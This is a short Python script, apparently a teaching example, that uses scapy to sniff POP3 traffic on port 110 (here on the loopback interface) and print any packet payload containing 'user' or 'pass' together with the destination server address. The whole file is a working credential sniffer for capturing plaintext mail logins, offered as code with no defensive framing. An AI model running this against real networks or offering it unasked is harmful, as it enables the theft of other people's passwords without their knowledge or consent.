#!/usr/bin/env python3

from scapy.all import *

def packet_callback(packet):


    if TCP in packet and packet[TCP].payload:

        mail_packet = bytes(packet[TCP].payload).decode(
            "utf-8", errors="ignore"
        )

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():

            print("[*] Server:", packet[IP].dst)
            print("[*]", mail_packet)


sniff(
    iface="lo",
    filter="tcp port 110",
    prn=packet_callback,
    store=0
)